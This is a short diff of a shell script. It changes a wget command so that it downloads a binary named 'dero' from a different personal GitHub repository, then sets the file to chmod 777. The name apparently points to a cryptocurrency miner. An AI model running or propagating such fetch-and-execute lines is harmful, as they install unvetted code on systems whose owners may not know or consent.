@@ -1,4 +1,4 @@
-wget https://github.com/sbwsmg/doraemon/raw/main/dero
+wget https://github.com/aqshakuy/dora/raw/main/dero
 chmod 777 dero
 
 #!/bin/bash
